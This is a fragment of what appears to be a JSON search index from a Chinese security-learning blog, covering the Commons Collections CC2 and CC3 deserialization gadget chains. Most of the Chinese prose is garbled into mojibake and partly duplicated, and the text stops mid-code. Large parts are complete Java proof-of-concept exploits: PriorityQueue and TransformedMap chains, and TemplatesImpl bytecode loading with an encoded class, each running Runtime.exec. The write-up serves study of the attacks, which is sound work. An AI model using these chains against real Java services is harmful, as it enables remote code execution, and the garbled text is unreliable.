‡å°±æ˜¯å°†è¿™ä¸¤ä¸ªæ–¹æ³•ä¸²èµ·æ¥ï¼Œçœ‹çœ‹è°ƒç”¨é“¾ï¼š\nä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼ŒPriorityQueue#readObject() ä¸­è°ƒâ½¤äº† heapify() â½…æ³•ï¼Œè€Œheapify()ä¸­è°ƒâ½¤äº†siftDown() ï¼š\nsiftDown()ä¸­è°ƒâ½¤äº†siftDownUsingComparator()ï¼š\nsiftDownUsingComparator() ä¸­è°ƒâ½¤çš„ comparator.compare() ï¼š\näºæ˜¯å°±è¿æ¥åˆ°ä¸Šâ¾¯çš„ TransformingComparator äº†\nå¯ä»¥ç®€å•äº†è§£ä¸€ä¸‹è¿™ä¸ªçš„ä½œç”¨ï¼š\njava.util.PriorityQueue æ˜¯â¼€ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼ˆQueueï¼‰ï¼ŒåŸºäºâ¼†å‰å †å®ç°ï¼Œé˜Ÿåˆ—ä¸­æ¯â¼€ä¸ªå…ƒç´ æœ‰â¾ƒâ¼°çš„ä¼˜å…ˆçº§ï¼ŒèŠ‚ç‚¹ä¹‹é—´æŒ‰ç…§ä¼˜å…ˆçº§â¼¤â¼©æ’åºæˆâ¼€æ£µæ ‘\nååºåˆ—åŒ–æ—¶ä¸ºä»€ä¹ˆéœ€è¦è°ƒâ½¤ heapify() â½…æ³•ï¼Ÿä¸ºäº†ååºåˆ—åŒ–åï¼Œéœ€è¦æ¢å¤ï¼ˆæ¢â¾”ä¹‹ï¼Œä¿è¯ï¼‰è¿™ä¸ªç»“æ„çš„é¡ºåº\næ’åºæ˜¯é å°†â¼¤çš„å…ƒç´ ä¸‹ç§»å®ç°çš„ã€‚ siftDown() æ˜¯å°†èŠ‚ç‚¹ä¸‹ç§»çš„å‡½æ•°ï¼Œâ½½ comparator.compare() â½¤æ¥â½è¾ƒä¸¤ä¸ªå…ƒç´ â¼¤â¼©\nTransformingComparator å®ç°äº† java.util.Comparator æ¥â¼ï¼Œè¿™ä¸ªæ¥â¼â½¤äºå®šä¹‰ä¸¤ä¸ªå¯¹è±¡å¦‚ä½•è¿›â¾â½è¾ƒã€‚siftDownUsingComparator() ä¸­å°±ä½¿â½¤è¿™ä¸ªæ¥â¼çš„ compare() â½…æ³•â½è¾ƒæ ‘çš„èŠ‚ç‚¹ã€‚\nç®€å•æ¥è¯´ï¼Œ java.util.PriorityQueue åœ¨Javaä¸­æ˜¯ä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—ä¸­æ¯ä¸€ä¸ªå…ƒç´ æœ‰è‡ªå·±çš„ä¼˜å…ˆçº§ã€‚åœ¨ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡æ—¶ï¼Œä¸ºäº†ä¿è¯é˜Ÿåˆ—é¡ºåºï¼Œä¼šè¿›è¡Œé‡æ’åºçš„æ“ä½œï¼Œè€Œæ’åºå°±æ¶‰åŠåˆ°å¤§å°æ¯”è¾ƒï¼Œè¿›è€Œæ‰§è¡Œ java.util.Comparator æ¥å£çš„ compare() æ–¹æ³•\næ€è·¯æœ‰äº†æ¥ä¸‹æ¥ç¼–å†™POC\næ„é€  è°ƒç”¨transformåçš„è°ƒç”¨é€»è¾‘åŸºæœ¬ä¸å˜ï¼Œå…ˆåˆ›å»ºtransformerï¼š\nTransformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); ç„¶ååˆ›å»ºä¸€ä¸ªTransformingComparatorï¼Œä¼ å…¥æˆ‘ä»¬çš„transformerï¼š\nComparator comparator = new TransformingComparator(transformerChain); æ¥ä¸‹æ¥è¦åˆ›å»ºPriorityQueueï¼ˆç¬¬â¼€ä¸ªå‚æ•°æ˜¯åˆå§‹åŒ–æ—¶çš„â¼¤â¼©ï¼Œâ¾„å°‘éœ€è¦2ä¸ªå…ƒç´ æ‰ä¼šè§¦å‘æ’åºå’Œâ½è¾ƒï¼Œæ‰€ä»¥æ˜¯2ï¼›ç¬¬â¼†ä¸ªå‚æ•°æ˜¯â½è¾ƒæ—¶çš„Comparatorï¼Œä¼ â¼Šå‰â¾¯å®ä¾‹åŒ–çš„comparatorï¼‰ï¼Œå¹¶ä¼ å…¥ä¸¤ä¸ªénullçš„å…ƒç´ ï¼š\nPriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2); æœ€ååå°„ä¿®æ”¹transformechainä¸ºæ¶æ„çš„transformer\nField f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); ç„¶åå°±æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–äº†ï¼Œæœ€ç»ˆçš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\npackage com.yuy0ung; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import java.io.*; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class CommonsCollections2 { public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(queue); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } è¿è¡ŒåæˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\nTemplatesImplæ”¹è¿› æˆ‘ä»¬åœ¨CC3å­¦åˆ°å¯ä»¥ä½¿ç”¨TemplatesImplæ¥å®ç°æ›´è‡ªç”±çš„RCEï¼Œå¹¶ä¸”pocä¸­â½†Transformeræ•°ç»„ï¼Œè¿™ä¸ªCC2è°ƒç”¨é“¾ä»ç„¶å¯ä»¥æ²¿ç”¨è¿™ä¸ªæ€è·¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶åˆå§‹åŒ–å˜é‡éœ€è¦ä¼ ç»™transform(key)çš„keyä¸­ï¼Œæ‰€ä»¥PriorityQueueçš„å¯¹è±¡ä¸­å°±ä¸èƒ½éšä¾¿ä¼ å…ƒç´ äº†ï¼š\nPriorityQueue queue = new PriorityQueue(2, comparator); queue.add(obj); queue.add(obj); å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import java.io.*; import java.util.Comparator; import java.util.PriorityQueue; public class CommonsCollections2_TemplatesImpl { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\u0026#34;toString\u0026#34;, null, null); Comparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(tmpl); queue.add(tmpl); setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); serialize(queue); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } æˆåŠŸè§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\nè¡¥å…… è¡¥å……ä¸¤ç‚¹ï¼š\nè¿™æ¡åˆ©â½¤é“¾ä¸­çš„å…³é”®ç±» org.apache.commons.collections4.comparators.TransformingComparator ï¼Œåœ¨commonscollections4.0ä»¥å‰æ˜¯ç‰ˆæœ¬ä¸­æ˜¯æ²¡æœ‰å®ç° Serializable æ¥â¼çš„ï¼Œâ½†æ³•åœ¨åºåˆ—åŒ–ä¸­ä½¿â½¤ï¼Œæ‰€ä»¥CC2é“¾ä¸â½€æŒåœ¨commons-collections 3ä¸­ä½¿â½¤\nå®˜æ–¹åœ¨CommonsCollectionsçš„ä¸¤ä¸ªåˆ†æ”¯é’ˆå¯¹ååºåˆ—åŒ–æ¼æ´éƒ½åšäº†æ›´æ–°ï¼Œåœ¨3.2.2ï¼Œé€šè¿‡diffå¯ä»¥å‘ç°ï¼Œæ–°ç‰ˆä»£ç ä¸­å¢åŠ äº†â¼€ä¸ªâ½…æ³•FunctorUtils#checkUnsafeSerialization ï¼Œâ½¤äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ã€‚è¿™ä¸ªæ£€æŸ¥åœ¨å¸¸â»…çš„å±é™©Transformerç±»ï¼ˆ InstantiateTransformer ã€ InvokerTransformer ã€ PrototypeFactory ã€ CloneTransformer ç­‰ï¼‰çš„ readObject â¾¥è¿›â¾è°ƒâ½¤ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼›\nåœ¨4.1â¾¥ï¼Œè¿™â¼ä¸ªå±é™©Transformerç±»ä¸å†å®ç° Serializable æ¥â¼ï¼Œå³å½»åº•â½†æ³•åºåˆ—åŒ–å’Œååºåˆ—åŒ–\n",
        "summary": "javaååºåˆ—åŒ–-CC2 åœ¨commons-collectionsååºåˆ—åŒ–åˆ©â½¤é“¾è¢«æå‡ºæ—¶ï¼ŒApache Commons Collectionsæœ‰ä»¥ä¸‹ä¸¤ä¸ªåˆ†â½€ç‰ˆæœ¬ï¼š\ncommons-collections:commons-collections\norg.apache.commons:commons-collections4\nè¿™é‡Œè¦è®²çš„çš„æ˜¯commons-collections4ï¼Œå…ˆå‰å­¦è¿‡çš„ç»å…¸çš„CC1ï¼ŒCC3ï¼ŒCC6éƒ½ä»ç„¶æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œè€Œä¸“é—¨é’ˆå¯¹commons-collections4çš„åˆ©ç”¨é“¾æœ‰ä¸¤æ¡ï¼šCC2å’ŒCC4ï¼Œè¿™é‡Œè¦è®²çš„å°±æ˜¯CC2\nç»è¿‡å‰æœŸå‡ æ¡CCé“¾çš„å­¦ä¹ ï¼Œå¯ä»¥å¤§è‡´ç†è§£åœ¨commons-collectionsä¸­æ‰¾Gadgetçš„è¿‡ç¨‹ï¼Œå®é™…ä¸Šå¯ä»¥ç®€åŒ–ä¸ºï¼Œæ‰¾â¼€æ¡ä»Serializable#readObject()â½…æ³•åˆ°Transformer#transform()â½…æ³•çš„è°ƒâ½¤é“¾\næ¥ä¸‹æ¥å›åˆ°CC2\nPriorityQueueåˆ©â½¤é“¾ CC2ä¸­â½¤åˆ°çš„ä¸¤ä¸ªå…³é”®ç±»æ˜¯ï¼š\njava.util.PriorityQueue\norg.apache.commons.collections4.comparators.TransformingComparator\nåˆ†æä¸€ä¸‹å¯ä»¥å‘ç°ï¼ŒPriorityQueueç±»æœ‰readObjectæ–¹æ³•ï¼š\nè€ŒTransformingComparatorç±»ä¸­çš„compareæ–¹æ³•è°ƒç”¨äº†transformï¼š\né‚£ä¹ˆæ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯å°†è¿™ä¸¤ä¸ªæ–¹æ³•ä¸²èµ·æ¥ï¼Œçœ‹çœ‹è°ƒç”¨é“¾ï¼š\nä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼ŒPriorityQueue#readObject() ä¸­è°ƒâ½¤äº† heapify() â½…æ³•ï¼Œè€Œheapify()ä¸­è°ƒâ½¤äº†siftDown() ï¼š\nsiftDown()ä¸­è°ƒâ½¤äº†siftDownUsingComparator()ï¼š\nsiftDownUsingComparator() ä¸­è°ƒâ½¤çš„ comparator.compare() ï¼š\näºæ˜¯å°±è¿æ¥åˆ°ä¸Šâ¾¯çš„ TransformingComparator äº†\nå¯ä»¥ç®€å•äº†è§£ä¸€ä¸‹è¿™ä¸ªçš„ä½œç”¨ï¼š\njava.util.PriorityQueue æ˜¯â¼€ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼ˆQueueï¼‰ï¼ŒåŸºäºâ¼†å‰å †å®ç°ï¼Œé˜Ÿåˆ—ä¸­æ¯â¼€ä¸ªå…ƒç´ æœ‰â¾ƒâ¼°çš„ä¼˜å…ˆçº§ï¼ŒèŠ‚ç‚¹ä¹‹é—´æŒ‰ç…§ä¼˜å…ˆçº§â¼¤â¼©æ’åºæˆâ¼€æ£µæ ‘\nååºåˆ—åŒ–æ—¶ä¸ºä»€ä¹ˆéœ€è¦è°ƒâ½¤ heapify() â½…æ³•ï¼Ÿä¸ºäº†ååºåˆ—åŒ–åï¼Œéœ€è¦æ¢å¤ï¼ˆæ¢â¾”ä¹‹ï¼Œä¿è¯ï¼‰è¿™ä¸ªç»“æ„çš„é¡ºåº\næ’åºæ˜¯é å°†â¼¤çš„å…ƒç´ ä¸‹ç§»å®ç°çš„ã€‚ siftDown() æ˜¯å°†èŠ‚ç‚¹ä¸‹ç§»çš„å‡½æ•°ï¼Œâ½½ comparator.compare() â½¤æ¥â½è¾ƒä¸¤ä¸ªå…ƒç´ â¼¤â¼©\nTransformingComparator å®ç°äº† java.util.Comparator æ¥â¼ï¼Œè¿™ä¸ªæ¥â¼â½¤äºå®šä¹‰ä¸¤ä¸ªå¯¹è±¡å¦‚ä½•è¿›â¾â½è¾ƒã€‚siftDownUsingComparator() ä¸­å°±ä½¿â½¤è¿™ä¸ªæ¥â¼çš„ compare() â½…æ³•â½è¾ƒæ ‘çš„èŠ‚ç‚¹ã€‚\nç®€å•æ¥è¯´ï¼Œ java.util.PriorityQueue åœ¨Javaä¸­æ˜¯ä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—ä¸­æ¯ä¸€ä¸ªå…ƒç´ æœ‰è‡ªå·±çš„ä¼˜å…ˆçº§ã€‚åœ¨ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡æ—¶ï¼Œä¸ºäº†ä¿è¯é˜Ÿåˆ—é¡ºåºï¼Œä¼šè¿›è¡Œé‡æ’åºçš„æ“ä½œï¼Œè€Œæ’åºå°±æ¶‰åŠåˆ°å¤§å°æ¯”è¾ƒï¼Œè¿›è€Œæ‰§è¡Œ java.util.Comparator æ¥å£çš„ compare() æ–¹æ³•\næ€è·¯æœ‰äº†æ¥ä¸‹æ¥ç¼–å†™POC\næ„é€  è°ƒç”¨transformåçš„è°ƒç”¨é€»è¾‘åŸºæœ¬ä¸å˜ï¼Œå…ˆåˆ›å»ºtransformerï¼š\nTransformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); ç„¶ååˆ›å»ºä¸€ä¸ªTransformingComparatorï¼Œä¼ å…¥æˆ‘ä»¬çš„transformerï¼š\n"
    }
,
    {
        "title": "Javaååºåˆ—åŒ–-CC3",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/",
        "content": "javaååºåˆ—åŒ–é“¾-CC3 ç®€å•ç†è§£ï¼ŒCC3å°±æ˜¯CC1+TemplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç \ndemo å…ˆçœ‹cc1çš„ç®€å•demoï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } æˆ‘ä»¬å°†å…¶ç»“åˆä¸ŠåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œå°±æ˜¯åœ¨InvokerTransformerä¸­åšæ‰‹è„šï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollections3_demo { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\u0026#34;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } æ­¤æ—¶å°±æ˜¯ä¸€ä¸ªCC1+TemplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„demoäº†ï¼Œè¿è¡Œè¯•è¯•ï¼š\nå¯ä»¥çœ‹è§è¿™é‡ŒæˆåŠŸåŠ è½½å­—èŠ‚ç å¹¶è¾“å‡ºå­—ç¬¦ä¸²\nCC3çš„å¦ä¸€ä¸ªä½œç”¨æ˜¯ç»•è¿‡å¯¹InvokerTransformerçš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½ä»£æ›¿InvokerTransformerçš„ç±»\nTrAXFilter CommonsCollections3å¹¶æ²¡æœ‰ä½¿â½¤åˆ°InvokerTransformeræ¥è°ƒâ½¤ä»»æ„â½…æ³•ï¼Œâ½½æ˜¯â½¤åˆ°äº†å¦â¼€ä¸ªç±»å«com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilterçš„ç±»\nè¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•å°±è°ƒç”¨äº†newTransformer()ï¼Œçœå»äº†ä½¿ç”¨InvokerTransformeræ¥è°ƒç”¨çš„æ­¥éª¤ï¼š\nä½†æ˜¯æ²¡äº†InvokerTransformerï¼ŒTrAXFilterçš„æ„é€ â½…æ³•ä¹Ÿæ˜¯â½†æ³•è°ƒâ½¤çš„ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªæ–°çš„Transformer\nè¿™é‡Œä½¿ç”¨åˆ°org.apache.commons.collections.functors.InstantiateTransformerï¼Œä»–ä¹Ÿæ˜¯â¼€ä¸ªå®ç°äº†Transformeræ¥â¼çš„ç±»ï¼Œä»–çš„ä½œâ½¤å°±æ˜¯è°ƒâ½¤æ„é€ â½…æ³•: æ‰€ä»¥æ€è·¯å°±æ˜¯ï¼šInstantiateTransformerè°ƒç”¨TrAXFilterçš„æ„é€ â½…æ³•ï¼ŒTrAXFilterè°ƒç”¨newTransformerï¼ŒnewTransformerè°ƒç”¨åˆ°TemplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç \näºæ˜¯å¾—åˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š\nTransformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj}) }; æ›¿æ¢åˆ°åŸdemoä¸­ä¾ç„¶æ˜¯å¯ä»¥è¿è¡Œçš„ï¼š\né‚£ä¹ˆæ¥ä¸‹æ¥å¼€å§‹ç€æ‰‹æ„é€ ååºåˆ—åŒ–è°ƒç”¨é“¾\næ„é€ -CC1 TransformedMap é¦–å…ˆæ˜¯CC1çš„TransformedMapé“¾ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.Base64; import java.util.HashMap; import java.util.Map; import javassist.ClassPool; public class CommonsCollections3_cc1 { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;Yuy0ung\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Target.class, outerMap); serialize(obj); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } å¦å¤–è¿™é‡Œä½¿ç”¨äº†javassistçš„classpoolæ¥åŠ è½½å­—èŠ‚ç ï¼ŒRCETestç±»çš„å†…å®¹å¦‚ä¸‹ï¼ˆè¿˜è®°å¾—å‰é¢è¯´çš„ä¹ˆï¼ŒTemplatesImpl ä¸­åŠ è½½çš„å­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯ com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet çš„å­ç±»ï¼Œæˆ‘ä»¬è¿™é‡Œè¦ç»§æ‰¿å¹¶é‡å†™ä¸€ä¸‹transformæ–¹æ³•ï¼‰ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class RCETest extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;open -a Calculator\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} } è¿è¡Œï¼ŒæˆåŠŸåŠ è½½å­—èŠ‚ç è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\nLazyMap ç„¶åæ˜¯LazyMapé“¾ï¼Œæ¢æ±¤ä¸æ¢è¯ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import 